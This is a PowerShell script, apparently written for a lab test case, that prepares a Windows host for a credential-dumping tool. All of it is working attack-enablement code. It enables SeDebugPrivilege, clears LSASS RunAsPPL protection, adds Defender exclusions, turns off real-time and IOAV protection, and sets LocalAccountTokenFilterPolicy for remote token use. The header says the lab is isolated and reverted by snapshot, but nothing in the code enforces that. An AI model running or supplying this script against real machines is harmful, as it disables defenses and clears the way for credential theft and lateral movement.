# c0015_prep.ps1 - prepare a host so a credential-dumping tool can run
#
# Run as an administrator on the target. Idempotent. Writes C:\ProgramData\c0015-prep.txt
#
# What it changes:
#   - SeDebugPrivilege: enabled in the current process and not removed by policy
#   - RunAsPPL: cleared so LSASS can be opened by an administrative context
#   - Defender: exclusions for the tool directories, real-time monitoring off (lab only)
#   - LocalAccountTokenFilterPolicy: lets a local account use its full token remotely
#
# The lab is isolated and every change is reverted by the snapshot.

$report = 'C:\ProgramData\c0015-prep.txt'
function W($s) { Add-Content -Path $report -Value ((Get-Date).ToUniversalTime().ToString('o') + ' ' + $s) }
Remove-Item $report -ErrorAction SilentlyContinue

# --- SeDebugPrivilege in this process ---------------------------------------
$sig = @'
using System;
using System.Runtime.InteropServices;
public class TokenPriv {
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool LookupPrivilegeValue(string host, string name, out long luid);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TP newst, int len, IntPtr prev, IntPtr rl);
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    public struct TP { public int Count; public long Luid; public int Attr; }
    public static bool Enable(string name) {
        IntPtr tok;
        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x28, out tok)) return false;
        long luid;
        if (!LookupPrivilegeValue(null, name, out luid)) return false;
        TP tp = new TP(); tp.Count = 1; tp.Luid = luid; tp.Attr = 2;
        return AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
'@
try {
    Add-Type -TypeDefinition $sig -ErrorAction Stop
    $ok = [TokenPriv]::Enable('SeDebugPrivilege')
    W "sedebug=$ok"
} catch {
    W "sedebug=error:$($_.Exception.Message)"
}

# --- LSASS protection -------------------------------------------------------
try {
    $lsa = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
    $cur = (Get-ItemProperty $lsa -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
    W "runasppl_before=$cur"
    if ($null -ne $cur -and $cur -ne 0) {
        Set-ItemProperty $lsa -Name RunAsPPL -Value 0 -Type DWord
        W 'runasppl_set=0 (effective after reboot)'
    }
} catch { W "runasppl_error=$($_.Exception.Message)" }

# --- Defender ---------------------------------------------------------------
try {
    foreach ($p in 'C:\Tools','C:\ProgramData','C:\Windows\Temp','C:\Users\Public') {
        Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
    }
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    $rt = (Get-MpPreference).DisableRealtimeMonitoring
    W "defender_rt_disabled=$rt"
} catch { W "defender_error=$($_.Exception.Message)" }

# --- remote token use for local accounts ------------------------------------
try {
    $lsa = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
    Set-ItemProperty $lsa -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord -ErrorAction SilentlyContinue
    W 'latfp=1'
} catch { W "latfp_error=$($_.Exception.Message)" }

# --- state ------------------------------------------------------------------
W ("whoami=" + (whoami))
W ("os=" + (Get-CimInstance Win32_OperatingSystem).Caption)
Get-Content $report
